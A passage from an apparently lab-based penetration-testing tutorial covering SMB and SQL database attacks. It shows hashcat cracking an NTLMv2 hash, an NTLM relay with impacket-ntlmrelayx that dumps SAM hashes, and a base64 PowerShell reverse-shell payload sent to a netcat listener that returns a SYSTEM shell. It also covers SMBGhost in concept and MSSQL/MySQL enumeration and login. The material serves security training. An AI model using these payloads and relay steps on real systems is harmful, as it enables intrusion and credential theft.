Time.Started.....: Mon Apr <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34</span> <span class="hljs-number">2022</span> (<span class="hljs-number">1</span> sec)
Time.Estimated...: Mon Apr <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">49</span>:<span class="hljs-number">35</span> <span class="hljs-number">2022</span> (<span class="hljs-number">0</span> secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:  <span class="hljs-number">1122.4</span> kH/s (<span class="hljs-number">1.34</span>ms) @ Accel:<span class="hljs-number">1024</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">75776</span>/<span class="hljs-number">14344386</span> (<span class="hljs-number">0.53</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">75776</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">73728</span>/<span class="hljs-number">14344386</span> (<span class="hljs-number">0.51</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidates.#<span class="hljs-number">1.</span>...: compu -&gt; kodiak1

Started: Mon Apr <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34</span> <span class="hljs-number">2022</span>
Stopped: Mon Apr <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">49</span>:<span class="hljs-number">37</span> <span class="hljs-number">2022</span>
</code></pre>
<p>The NTLMv2 hash was cracked. The password is <code>P@ssword</code>. If we cannot crack the hash, we can potentially relay the captured hash to another machine using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">impacket-ntlmrelayx</a> or Responder <a href="https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py">MultiRelay.py</a>. Let us see an example using <code>impacket-ntlmrelayx</code>.</p>
<p>First, we need to set SMB to <code>OFF</code> in our responder configuration file (<code>/etc/responder/Responder.conf</code>).</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ cat /etc</span><span class="hljs-regexp">/responder/</span>Responder.conf | grep <span class="hljs-string">'SMB ='</span>

SMB = Off
</code></pre>
<p>Then we execute <code>impacket-ntlmrelayx</code> with the option <code>--no-http-server</code>, <code>-smb2support</code>, and the target machine with the option <code>-t</code>. By default, <code>impacket-ntlmrelayx</code> will dump the SAM database, but we can execute commands by adding the option <code>-c</code>.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.146</span>

Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

&lt;SNIP&gt;

[*] Running <span class="hljs-keyword">in</span> relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting <span class="hljs-keyword">for</span> connections

[*] SMBD-Thread<span class="hljs-number">-3</span>: Connection from <span class="hljs-regexp">/ADMINISTRATOR@10.10.110.1 controlled, attacking target smb:/</span>/<span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.146</span>
[*] Authenticating against <span class="hljs-string">smb:</span><span class="hljs-comment">//10.10.110.146 as /ADMINISTRATOR SUCCEED</span>
[*] SMBD-Thread<span class="hljs-number">-3</span>: Connection from /ADMINISTRATOR@<span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.1</span> controlled, but there are no more targets left!
[*] SMBD-Thread<span class="hljs-number">-5</span>: Connection from /ADMINISTRATOR@<span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.1</span> controlled, but there are no more targets left!
[*] Service RemoteRegistry is <span class="hljs-keyword">in</span> stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system <span class="hljs-string">bootKey:</span> <span class="hljs-number">0xeb0432b45874953711ad55884094e9d4</span>
[*] Dumping local SAM hashes (<span class="hljs-string">uid:</span><span class="hljs-string">rid:</span><span class="hljs-string">lmhash:</span>nthash)
<span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">2</span><span class="hljs-string">b576acbe6bcfda7294d6bd18041b8fe:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">WDAGUtilityAccount:</span><span class="hljs-number">504</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">92512</span><span class="hljs-string">f2605074cfc341a7f16e5fabf08:</span>::
<span class="hljs-string">demouser:</span><span class="hljs-number">1000</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">test:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">2</span><span class="hljs-string">b576acbe6bcfda7294d6bd18041b8fe:</span>::
[*] Done dumping SAM hashes <span class="hljs-keyword">for</span> <span class="hljs-string">host:</span> <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.146</span>
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state <span class="hljs-keyword">for</span> service RemoteRegistry
</code></pre>
<p>We can create a PowerShell reverse shell using <a href="https://www.revshells.com/">https://www.revshells.com/</a>, set our machine IP address, port, and the option Powershell #3 (Base64).</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ impacket-ntlmrelayx --<span class="hljs-literal">no</span>-http-server -smb2support -t <span class="hljs-number">192.168</span><span class="hljs-number">.220</span><span class="hljs-number">.146</span> -c <span class="hljs-string">'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'</span>
</code></pre>
<p>Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp <span class="hljs-number">9001</span>

listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">9001</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">110.133</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.10</span>.<span class="hljs-number">110.146</span>] <span class="hljs-number">52471</span>

PS C:<span class="hljs-string">\Windows\system32&gt;</span> whoami;hostname

nt authority<span class="hljs-string">\system</span>
WIN11BOX
</code></pre>
<h2 id="latest-smb-vulnerabilities">Latest SMB Vulnerabilities</h2>
<hr>
<p>One recent significant vulnerability that affected the SMB protocol was called <a href="https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796">SMBGhost</a> with the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796">CVE-2020-0796</a>. The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (<code>RCE</code>) and full access to the remote target system.</p>
<p>We will not discuss the vulnerability in detail in this section, as a very in-depth explanation requires some reverse engineering experience and advanced knowledge of CPU, kernel, and exploit development. Instead, we will only focus on the attack concept because even with more complicated exploits and vulnerabilities, the concept remains the same.</p>
<hr>
<h3 id="the-concept-of-the-attack">The Concept of the Attack</h3>
<p>In simple terms, this is an <a href="https://en.wikipedia.org/wiki/Integer\_overflow">integer overflow</a> vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. An integer overflow results from a CPU attempting to generate a number that is greater than the value required for the allocated memory space. Arithmetic operations can always return unexpected values, resulting in an error. An example of an integer overflow can occur when a programmer does not allow a negative number to occur. In this case, an integer overflow occurs when a variable performs an operation that results in a negative number, and the variable is returned as a positive integer. This vulnerability occurred because, at the time, the function lacked bounds checks to handle the size of the data sent in the process of SMB session negotiation.</p>
<p>To learn more about buffer overflow techniques and vulnerabilities, check out the<a href="https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86">Stack-Based Buffer Overflows on Linux x86</a>, and <a href="https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86">Stack-Based Buffer Overflows on Windows x86</a> module. These go into detail on the basics of how the buffer can be overwritten and handled by the attacker.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>The vulnerability occurs while processing a malformed compressed message after the <code>Negotiate Protocol Responses</code>. If the SMB server allows requests (over TCP/445), compression is generally supported, where the server and client set the terms of communication before the client sends any more data. Suppose the data transmitted exceeds the integer variable limits due to the excessive amount of data. In that case, these parts are written into the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process&#39;s normal or planned execution. These data sets can be structured so that the overwritten instructions are replaced with our own ones, and thus we force the CPU (and hence also the process) to perform other tasks and instructions.</p>
<p><strong>Initiation of the Attack</strong></p>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>SMBGhost</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>The client sends a request manipulated by the attacker to the SMB server.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>2.</code></td>
<td>The sent compressed packets are processed according to the negotiated protocol responses.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>3.</code></td>
<td>This process is performed with the system&#39;s privileges or at least with the privileges of an administrator.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>4.</code></td>
<td>The local process is used as the destination, which should process these compressed packets.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>
<p>This is when the cycle starts all over again, but this time to gain remote access to the target system.</p>
<p><strong>Trigger Remote Code Execution</strong></p>
<table data-header-hidden><thead><tr><th width="97"></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>SMBGhost</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>The sources used in the second cycle are from the previous process.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker&#39;s instructions and forcing the CPU to execute those instructions.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>The same privileges of the SMB server are used.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>The remote attacker system is used as the destination, in this case, granting access to the local system.</td><td><code>Destination</code></td></tr></tbody></table>

<p>However, despite the vulnerability&#39;s complexity due to the buffer&#39;s manipulation, which we can see in the <a href="https://www.exploit-db.com/exploits/48537">PoC</a>, the concept of the attack nevertheless applies here.</p>
<h2 id="attacking-sql-databases">Attacking SQL Databases</h2>
<hr>
<p><a href="https://www.mysql.com/">MySQL</a> and <a href="https://www.microsoft.com/en-us/sql-server/sql-server-2019">Microsoft SQL Server</a> (<code>MSSQL</code>) are <a href="https://en.wikipedia.org/wiki/Relational\_database">relational database</a> management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL &amp; MySQL use the <a href="https://en.wikipedia.org/wiki/SQL">Structured Query Language</a> (<code>SQL</code>) for querying and maintaining the database.</p>
<p>Databases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, <code>Personal Identifiable Information (PII)</code>, business-related data, and payment information. In addition, those services often are configured with highly privileged users. If we gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>By default, MSSQL uses ports <code>TCP/1433</code> and <code>UDP/1434</code>, and MySQL uses <code>TCP/3306</code>. However, when MSSQL operates in a &quot;hidden&quot; mode, it uses the <code>TCP/2433</code> port. We can use <code>Nmap</code>&#39;s default scripts <code>-sC</code> option to enumerate database services on a target system:</p>
<p><strong>Banner Grabbing</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ nmap -Pn -sV -sC -p1433 <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.125</span>

Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">'up'</span>, and scan times will be slower.
Starting Nmap <span class="hljs-number">7.91</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-08-26 02:09 BST</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.125</span>
Host is up (<span class="hljs-number">0.0099</span>s latency).

PORT     STATE SERVICE  VERSION
<span class="hljs-number">1433</span>/tcp open  ms-sql-s Microsoft SQL Server <span class="hljs-number">2017</span> <span class="hljs-number">14.00</span><span class="hljs-number">.1000</span><span class="hljs-number">.00</span>; RTM
| ms-sql-ntlm-<span class="hljs-string">info:</span> 
|   <span class="hljs-string">Target_Name:</span> HTB
|   <span class="hljs-string">NetBIOS_Domain_Name:</span> HTB
|   <span class="hljs-string">NetBIOS_Computer_Name:</span> mssql-test
|   <span class="hljs-string">DNS_Domain_Name:</span> HTB.LOCAL
|   <span class="hljs-string">DNS_Computer_Name:</span> mssql-test.HTB.LOCAL
|   <span class="hljs-string">DNS_Tree_Name:</span> HTB.LOCAL
|_  <span class="hljs-string">Product_Version:</span> <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span>
| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=SSL_Self_Signed_Fallback
| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-26</span><span class="hljs-string">T01:</span><span class="hljs-number">04</span>:<span class="hljs-number">36</span>
|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2051</span><span class="hljs-number">-08</span><span class="hljs-number">-26</span><span class="hljs-string">T01:</span><span class="hljs-number">04</span>:<span class="hljs-number">36</span>
|_ssl-<span class="hljs-string">date:</span> <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-26</span><span class="hljs-string">T01:</span><span class="hljs-number">11</span>:<span class="hljs-number">58</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">2</span>m05s from scanner time.

Host script <span class="hljs-string">results:</span>
|_clock-<span class="hljs-string">skew:</span> <span class="hljs-string">mean:</span> <span class="hljs-number">2</span>m04s, <span class="hljs-string">deviation:</span> <span class="hljs-number">0</span>s, <span class="hljs-string">median:</span> <span class="hljs-number">2</span>m04s
| ms-sql-<span class="hljs-string">info:</span> 
|   <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.125</span>:<span class="hljs-number">1433</span>: 
|     <span class="hljs-string">Version:</span> 
|       <span class="hljs-string">name:</span> Microsoft SQL Server <span class="hljs-number">2017</span> RTM
|       <span class="hljs-string">number:</span> <span class="hljs-number">14.00</span><span class="hljs-number">.1000</span><span class="hljs-number">.00</span>
|       <span class="hljs-string">Product:</span> Microsoft SQL Server <span class="hljs-number">2017</span>
|       Service pack <span class="hljs-string">level:</span> RTM
|       Post-SP patches <span class="hljs-string">applied:</span> <span class="hljs-literal">false</span>
|_    TCP <span class="hljs-string">port:</span> <span class="hljs-number">1433</span>
</code></pre>
<p>The Nmap scan reveals essential information about the target, like the version and hostname, which we can use to identify common misconfigurations, specific attacks, or known vulnerabilities. Let&#39;s explore some common misconfigurations and protocol specifics attacks.</p>
<hr>
<h3 id="authentication-mechanisms">Authentication Mechanisms</h3>
<p><code>MSSQL</code> supports two <a href="https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server">authentication modes</a>, which means that users can be created in Windows or the SQL Server:</p>
<table>
<thead>
<tr>
<th><strong>Authentication Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Windows authentication mode</code></td>
<td>This is the default, often referred to as <code>integrated</code> security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td>
</tr>
<tr>
<td><code>Mixed mode</code></td>
<td>Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td>
</tr>
</tbody>
</table>
<p><code>MySQL</code> also supports different <a href="https://dev.mysql.com/doc/internals/en/authentication-method.html">authentication methods</a>, such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode">choose an authentication mode</a> for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.</p>
<p>In the past, there was a vulnerability <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass">CVE-2012-2122</a> in <code>MySQL 5.6.x</code> servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the <code>timing attack</code> vulnerability existed in the way MySQL handled authentication attempts.</p>
<p>In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.</p>
<p>In the case of <code>MySQL 5.6.x</code>, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.</p>
<p><strong>Misconfigurations</strong></p>
<p>Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.</p>
<p><strong>Privileges</strong></p>
<p>Depending on the user&#39;s privileges, we may be able to perform different actions within a SQL Server, such as:</p>
<ul>
<li>Read or change the contents of a database</li>
<li>Read or change the server configuration</li>
<li>Execute commands</li>
<li>Read local files</li>
<li>Communicate with other databases</li>
<li>Capture the local system hash</li>
<li>Impersonate existing users</li>
<li>Gain access to other networks</li>
</ul>
<p>In this section, we will explore some of these attacks.</p>
<hr>
<h3 id="protocol-specific-attacks">Protocol Specific Attacks</h3>
<p>It is crucial to understand how SQL syntax works. We can use the free <a href="https://academy.hackthebox.com/course/preview/sql-injection-fundamentals">SQL Injection Fundamentals</a> module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.</p>
<p><strong>Read/Change the Database</strong></p>
<p>Let&#39;s imagine we gained access to a SQL Database. First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let&#39;s see how we can do this:</p>
<p><strong>MySQL - Connecting to the SQL Server</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u julio -pPassword123 -h <span class="hljs-number">10.129</span>.<span class="hljs-number">20.13</span>

Welcome <span class="hljs-keyword">to</span> the MariaDB monitor. Commands <span class="hljs-keyword">end</span> <span class="hljs-keyword">with</span> ; <span class="hljs-keyword">or</span> \g.
Your MySQL connection id <span class="hljs-keyword">is</span> <span class="hljs-number">8</span>
Server version: <span class="hljs-number">8.0</span>.<span class="hljs-number">28</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">20.04</span>.<span class="hljs-number">3</span> (Ubuntu)

Copyright (c) <span class="hljs-number">2000</span>, <span class="hljs-number">2018</span>, Oracle, MariaDB Corporation Ab <span class="hljs-keyword">and</span> others.

<span class="hljs-keyword">Type</span> <span class="hljs-string">'help;'</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'\h'</span> <span class="hljs-keyword">for</span> help. <span class="hljs-keyword">Type</span> <span class="hljs-string">'\c'</span> <span class="hljs-keyword">to</span> clear the current input statement.

MySQL [(none)]&gt;
</code></pre>
<p><strong>Sqlcmd - Connecting to the SQL Server</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -<span class="hljs-keyword">P</span> <span class="hljs-string">'MyPassword!'</span> -y <span class="hljs-number">30</span> -<span class="hljs-keyword">Y</span> <span class="hljs-number">30</span>

<span class="hljs-number">1</span>&gt;
</code></pre>
<p>Note: When we authenticate to MSSQL using <code>sqlcmd</code> we can use the parameters <code>-y</code> (SQLCMDMAXVARTYPEWIDTH) and <code>-Y</code> (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.</p>
<p>If we are targetting <code>MSSQL</code> from Linux, we can use <code>sqsh</code> as an alternative to <code>sqlcmd</code>:</p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sqsh -S <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.7</span> -U julio -P 'MyPassword!' -h

sqsh<span class="hljs-number">-2.5</span><span class="hljs-number">.16</span><span class="hljs-number">.1</span> Copyright (C) <span class="hljs-number">1995</span><span class="hljs-number">-2001</span> Scott C. Gray
Portions Copyright (C) <span class="hljs-number">2004</span><span class="hljs-number">-2014</span> Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
<span class="hljs-number">1</span>&gt;
</code></pre>
<p>Alternatively, we can use the tool from Impacket with the name <code>mssqlclient.py</code>.</p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ mssqlclient.py -p <span class="hljs-number">1433</span> julio@<span class="hljs-number">10.129</span>.<span class="hljs-number">203.7</span> 

Impacket v0.<span class="hljs-number">9.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching <span class="hljs-keyword">to</span> TLS
[*] ENVCHANGE(DATABASE): <span class="hljs-keyword">Old</span> Value: master, <span class="hljs-keyword">New</span> Value: master
[*] ENVCHANGE(LANGUAGE): <span class="hljs-keyword">Old</span> Value: None, <span class="hljs-keyword">New</span> Value: us_english
[*] ENVCHANGE(PACKETSIZE): <span class="hljs-keyword">Old</span> Value: <span class="hljs-number">4096</span>, <span class="hljs-keyword">New</span> Value: <span class="hljs-number">16192</span>
[*] INFO(WIN-<span class="hljs-number">02</span>\SQLEXPRESS): Line <span class="hljs-number">1</span>: Changed database context <span class="hljs-keyword">to</span> <span class="hljs-string">'master'</span>.
[*] INFO(WIN-<span class="hljs-number">02</span>\SQLEXPRESS): Line <span class="hljs-number">1</span>: Changed language setting <span class="hljs-keyword">to</span> us_english.
[*] ACK: <span class="hljs-keyword">Result</span>: <span class="hljs-number">1</span> - Microsoft SQL Server (<span class="hljs-number">120</span> <span class="hljs-number">7208</span>) 
[!] Press help <span class="hljs-keyword">for</span> extra shell commands
SQL&gt;
</code></pre>
<p>Note: When we authenticate to MSSQL using <code>sqsh</code> we can use the parameters <code>-h</code> to disable headers and footers for a cleaner look.</p>
<p>When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don&#39;t specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use <code>SERVERNAME\\accountname</code> or <code>.\\accountname</code>. The full command would look like:</p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sqsh -S <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.7</span> -U .\\julio -P 'MyPassword!' -h

sqsh<span class="hljs-number">-2.5</span><span class="hljs-number">.16</span><span class="hljs-number">.1</span> Copyright (C) <span class="hljs-number">1995</span><span class="hljs-number">-2001</span> Scott C. Gray
Portions Copyright (C) <span class="hljs-number">2004</span><span class="hljs-number">-2014</span> Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
<span class="hljs-number">1</span>&gt;
</code></pre>
<p><strong>SQL Default Databases</strong></p>
<p>Before we explore using SQL syntax, it is essential to know the default databases for <code>MySQL</code> and <code>MSSQL</code>. Those databases hold information about the database itself and help us enumerate database names, tables, columns, etc. With access to those databases, we can use some system stored procedures, but they usually don&#39;t contain company data.</p>
<p>Note: We will get an error if we try to list or connect to a database we don&#39;t have permissions to.</p>
<p><code>MySQL</code> default system schemas/databases:</p>
<ul>
<li><code>mysql</code> - is the system database that contains tables that store information required by the MySQL server</li>
<li><code>information_schema</code> - provides access to database metadata</li>
<li><code>performance_schema</code> - is a feature for monitoring MySQL Server execution at a low level</li>
<li><code>sys</code> - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema</li>
</ul>
<p><code>MSSQL</code> default system schemas/databases:</p>
<ul>
<li><code>master</code> - keeps the information for an instance of SQL Server.</li>
<li><code>msdb</code> - used by SQL Server Agent.</li>
<li><code>model</code> - a template database copied for each new database.</li>
<li><code>resource</code> - a read-only database that keeps system objects visible in every database on the server in sys schema.</li>
<li><code>tempdb</code> - keeps temporary objects for SQL queries.</li>
</ul>
<p><strong>SQL Syntax</strong></p>
<p><strong>Show Databases</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">mysql&gt; SHOW DATABASES;

<span class="hljs-code">+--------------------+</span>
<span class="hljs-section">| Database           |
+--------------------+</span>
| information<span class="hljs-emphasis">_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)</span>
</code></pre>
<p>If we use <code>sqlcmd</code>, we will need to use <code>GO</code> after our query to execute the SQL syntax.</p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT name FROM master.dbo.sysdatabases
<span class="hljs-meta">2&gt; </span>GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
</code></pre>
<p><strong>Select a Database</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">mysql&gt; <span class="hljs-keyword">USE</span> <span class="hljs-title">htbusers</span>;

Database changed
</code></pre>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>USE htbusers
<span class="hljs-meta">2&gt; </span>GO

Changed database context to <span class="hljs-string">'htbusers'</span>.
</code></pre>
<p><strong>Show Tables</strong></p>
<p>Attacking SQL Databases</p>
